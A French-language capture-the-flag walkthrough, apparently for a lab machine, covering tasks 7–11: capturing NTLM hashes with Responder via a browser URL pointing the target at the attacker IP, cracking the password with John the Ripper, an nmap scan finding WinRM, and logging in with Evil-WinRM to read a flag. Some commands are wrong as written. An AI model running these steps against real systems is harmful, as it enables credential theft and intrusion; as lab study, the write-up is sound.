
# Guide Responder

## ---------- Task 7


## Dans le terminal

Le flag `-I` de Responder permet de spécifier une interface. Voici un exemple d'utilisation :

```bash
responder -I 10.10.14.92
```
Avec cette commande nous faisons appel a l'outils puis on y insert le flag -I pour pouvoir préciser une interface.<br/>

## Dans le navigateur

```bash
http://domaine.cible\\10.10.14.92/toto
```
Dans le navigateur nous allons préciser le domaine que nous voulons exploiter, l'adresse IP vers la quelle les information doivent être renvoyer pui finalement nous y insserons un dossier fictif vers le quelle les information sont censer écrite

## ---------- Task 8 - John The Ripper

Trouver l'outils qui permet de crack des password et souvent appeller john!

-> John The Ripper Obviously!

## ---------- Task 9 - Décryptage avec John The Ripper

Decryptons le password en utilisant john the ripper

command utiliser -> john --wordlist=/usr/share/wordlists/rockyou.txt

on appel john puis on lui passe une wordlist bien précise pour ne pas qu'il passe tout en revu et pour une question de rapidité et clui ci nous retourneras si tout ce passe bien le mot de passe voulu
	

Résultat -> badminbton Obviously!!!

## ---------- Task 10 - Scan Nmap

precision des 6000 premier port pour un scan plus large car lors de la tache un sans precision celui ci a scan que les 1000 premier port

avec -> 
	namp -p int1-int2 -sV -sC [ip]
	
ainsi on voit le port 5985 reponse a la task 10

## ---------- Task 11 - Exploitation avec Evil-WinRM

Téléchargez Evil-WinRM.

Connectez-vous à la cible :

evil-winrm -i [ip] (de la cible) -u 'admin name' -p 'password de la cible'

Après quelques recherches dans les fichiers divers, le flag est trouvé à l'emplacement:

/user/mike/desktop/flag.txt

## -------

Note : Assurez-vous d'agir de manière éthique et légale dans toutes les activités de sécurité informatique. Respectez toujours les règles et les politiques en place.
```bash
```
